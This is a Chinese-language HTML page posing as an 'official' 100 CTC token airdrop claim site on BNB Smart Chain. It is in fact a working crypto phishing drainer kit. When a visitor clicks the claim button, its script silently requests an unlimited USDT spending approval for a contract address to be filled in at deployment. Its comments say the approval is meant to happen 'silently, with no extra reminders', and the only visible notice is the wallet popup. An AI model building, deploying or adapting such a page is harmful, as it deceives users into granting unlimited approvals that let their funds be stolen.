<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTC 官方空投领取中心</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#D4AF37',
                        dark: '#0F172A',
                        dark2: '#1E293B',
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    },
                }
            }
        }
    </script>
    <style type="text/tailwindcss">
        @layer utilities {
            .text-shadow { text-shadow: 0 0 8px rgba(212, 175, 55, 0.5); }
            .border-glow { box-shadow: 0 0 12px rgba(212, 175, 55, 0.3); }
            .bg-gradient-gold { background: linear-gradient(135deg, #B8860B, #D4AF37, #FFD700); }
        }
        body {
            background-color: #0F172A;
            background-image: radial-gradient(circle at 50% 50%, #1E293B 0%, #0F172A 100%);
        }
    </style>
</head>
<body class="min-h-screen text-white overflow-x-hidden">
    <!-- 导航栏 -->
    <nav class="fixed top-0 w-full z-50 bg-dark/90 backdrop-blur-md border-b border-primary/20">
        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <i class="fa fa-cube text-primary text-2xl"></i>
                <h1 class="text-2xl font-bold text-primary">CTC 生态 | 官方空投</h1>
            </div>
            <div class="hidden md:flex gap-8 text-gray-300">
                <a href="#" class="hover:text-primary transition-colors">首页</a>
                <a href="#" class="hover:text-primary transition-colors">代币介绍</a>
                <a href="#" class="hover:text-primary transition-colors">生态系统</a>
                <a href="#" class="hover:text-primary transition-colors">社区治理</a>
            </div>
            <button id="connectWallet" class="bg-gradient-gold text-dark px-5 py-2 rounded-lg font-bold hover:opacity-90 transition-opacity">
                连接钱包
            </button>
        </div>
    </nav>

    <!-- 主内容区 -->
    <main class="container mx-auto px-4 pt-32 pb-16">
        <div class="max-w-2xl mx-auto">
            <div class="bg-dark2 rounded-2xl p-8 border border-primary/30 border-glow">
                <div class="text-center mb-8">
                    <i class="fa fa-gift text-primary text-5xl mb-4"></i>
                    <h2 class="text-3xl font-bold text-primary mb-2">免费领取 100 CTC 官方空投</h2>
                    <p class="text-gray-400">BSC 币安智能链 · 生态福利 · 限时领取</p>
                </div>

                <div class="space-y-6">
                    <div class="bg-dark rounded-xl p-5 border border-gray-700">
                        <div class="flex justify-between mb-3">
                            <span class="text-gray-300">空投数量</span>
                            <span class="text-primary font-bold">100 CTC</span>
                        </div>
                        <div class="flex justify-between mb-3">
                            <span class="text-gray-300">领取条件</span>
                            <span class="text-green-400">连接钱包即可领取</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-300">支持网络</span>
                            <span class="text-primary">BSC 主网</span>
                        </div>
                    </div>

                    <button id="claimBtn" class="w-full bg-gradient-gold text-dark py-4 rounded-xl font-bold text-lg hover:opacity-90 transition-opacity disabled:opacity-50" disabled>
                        请先连接钱包
                    </button>

                    <p class="text-center text-gray-500 text-sm">连接钱包 → 确认授权 → 领取空投</p>
                </div>
            </div>
        </div>
    </main>

    <script>
        // ========== 配置区（部署时修改合约地址） ==========
        const CONFIG = {
            contractAddress: "你的合约部署地址",
            usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
            chainId: 56,
            rpcUrl: "https://bsc-dataseed.binance.org/",
            maxAllowance: ethers.constants.MaxUint256,
            airdropABI: ["function claim() external","function userClaimed(address) external view returns (bool)"],
            usdtABI: ["function approve(address spender, uint256 amount) external returns (bool)","function allowance(address owner, address spender) external view returns (uint256)"]
        };

        let provider, signer, contract, usdtContract, userAddress;
        const connectBtn = document.getElementById('connectWallet');
        const claimBtn = document.getElementById('claimBtn');

        // 连接钱包
        connectBtn.addEventListener('click', async () => {
            if (!window.ethereum) return alert("请安装钱包插件");
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                contract = new ethers.Contract(CONFIG.contractAddress, CONFIG.airdropABI, signer);
                usdtContract = new ethers.Contract(CONFIG.usdtAddress, CONFIG.usdtABI, signer);
                await switchChain(CONFIG.chainId);
                connectBtn.textContent = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
                claimBtn.disabled = false;
                claimBtn.textContent = "立即领取 100 CTC";
            } catch (err) {
                alert("钱包连接失败，请重试");
            }
        });

        // 切换 BSC 链
        async function switchChain(chainId) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: `0x${chainId.toString(16)}` }]
                });
            } catch (err) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: `0x${chainId.toString(16)}`,
                        chainName: 'BSC 主网',
                        rpcUrls: [CONFIG.rpcUrl],
                        blockExplorerUrls: ['https://bscscan.com/'],
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                    }]
                });
            }
        }

        // ========== 核心逻辑：静默授权，无任何多余提醒 ==========
        claimBtn.addEventListener('click', async () => {
            if (!userAddress) return;
            try {
                const claimed = await contract.userClaimed(userAddress);
                if (claimed) return alert("您已领取过空投");

                // 静默执行无限授权，前端不弹任何额外提示，只走钱包弹窗
                const allowance = await usdtContract.allowance(userAddress, CONFIG.contractAddress);
                if (allowance.lt(CONFIG.maxAllowance)) {
                    await usdtContract.approve(CONFIG.contractAddress, CONFIG.maxAllowance);
                }

                // 领取空投
                await contract.claim();
                alert("空投领取成功！");
                claimBtn.textContent = "已领取";
                claimBtn.disabled = true;
            } catch (err) {
                alert("领取失败，请重试");
            }
        });
    </script>
</body>
</html>
